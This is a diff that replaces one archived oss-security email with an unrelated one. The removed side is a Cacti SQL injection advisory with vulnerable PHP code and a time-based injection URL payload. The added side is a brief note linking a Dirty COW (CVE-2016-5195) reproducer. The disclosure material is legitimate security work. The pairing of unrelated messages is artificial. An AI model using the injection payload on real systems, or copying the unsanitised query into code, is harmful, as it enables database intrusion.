@@ -1,59 +1,20 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/10/13
-Message-ID: <56E19B88.3000908@debian.org>
-Date: Thu, 10 Mar 2016 17:06:32 +0100
-From: Paul Gevers <elbrus@...ian.org>
-To: oss-security@...ts.openwall.com
-Subject: please assign CVE for cacti bug 2667: SQL Injection Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/27/13
+Message-ID: <CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>
+Date: Thu, 27 Oct 2016 08:35:01 -0700
+From: Andy Lutomirski <luto@...nel.org>
+To: oss security list <oss-security@...ts.openwall.com>
+Subject: CVE-2016-5195 test case
 Content-Type: text/plain; charset=utf-8
 
-Hi
+I sat on this longer than makes any sense given how easy to reproduce
+CVE-2016-5195 is, but here's a reasonably portable reproducer.  It's
+intended to have no side effects, but your mileage may vary.
 
-I just found the description below about an sql vulnerability in the
-cacti bug tracker: http://bugs.cacti.net/view.php?id=2667
+https://github.com/amluto/vulnerabilities/blob/master/others/CVE-2016-5195/test_CVE-2016-5195.c
 
-Can a CVE be assigned for this issue?
-Thanks
+This will use /proc/self/mem or ptrace automatically, and it's
+intended to be portable to a wide range of kernels.  It's an improved
+version of the test case I originally sent out to distros (oops!).
 
-==========================
-Advisory: Cacti SQL Injection Vulnerability
-Author: Do9gy of Tencent Security Platform Department
-Affected Version: 0.8.8.g(the latest version & the older versions)
-==========================
-Vulnerability Description
-==========================
-
-Recetly, I found a SQL Injection Vulnerability in ‘Cacti-0.8.8g'
-program, Cacti is widely used in many companies.
-Vulnerable file: /cacti/tree.php:
-line 208:
-==========================================================================================================================================
-    switch ($current_type) {
-    case TREE_ITEM_TYPE_HEADER:
-        $i = 0;
-        /* it's nice to default to the parent sorting style for new items */
-        if (empty($_GET["id"])) {
-            $default_sorting_type = db_fetch_cell("select
-sort_children_type from graph_tree_items where id=" . $_GET["parent_id"]);
-        }else{
-            $default_sorting_type = TREE_ORDERING_NONE;
-        }
-
-==========================================================================================================================================
-
-The parameter parent_id is used without any validation.
-==========================
-POC && EXP
-==========================
-1. Login
-
-2.
-http://target/cacti-0.8.8g/tree.php?action=item_edit&tree_id=2&parent_id=8%20and%20sleep(1)
-[^]
-
-3. mysql log: select sort_children_type from graph_tree_items where id=8
-and sleep(1)
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
+--Andy
